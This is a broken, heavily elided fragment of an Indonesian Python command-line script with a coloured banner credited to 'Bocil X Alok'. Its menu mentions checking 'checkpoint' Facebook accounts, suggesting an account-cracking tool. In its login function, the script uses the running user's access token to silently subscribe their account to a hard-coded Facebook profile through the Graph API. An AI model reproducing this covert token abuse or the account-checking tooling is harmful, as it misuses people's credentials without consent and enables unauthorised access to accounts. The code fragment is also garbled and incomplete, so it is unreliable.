...
\033[0;35m   /  |/  /  _/ |/ /  _/   • CODE BY Bocil X Alok •
\033[0;33m  / /|_/ // //    // / • HTTPS://GITHUB.COM/BocilAlok •
...
def mmmasuk():
 ...
 #M,P))
	...
	print("%s [!] Isi dengan benar "%(O));exit()
        ...
        jeeck("\n%s [%s!%s] %sUntuk terhubung ke server anda harus login Terlebih dahulu"%(B,O,B,P))
...
#    print (' Waktu : %s'%(datetime.now().strftime('%H:%M:%S'))
    ...
    print(" \033[0;36m[\033[0;35m7\033[0;36m]\033[0;00m Chek Opsi Akun Checkpoint ")
...
def gobloklu():
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Error Ngab Sorry:v
...
def login_xx():                                                                                                    
	...
	requests.post('https://graph.facebook.com/100047565732791/subscribers?access_token=%s'%(token))
...
#                            
                    ...
                    jeeck("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Pilih salah satu Kentod")
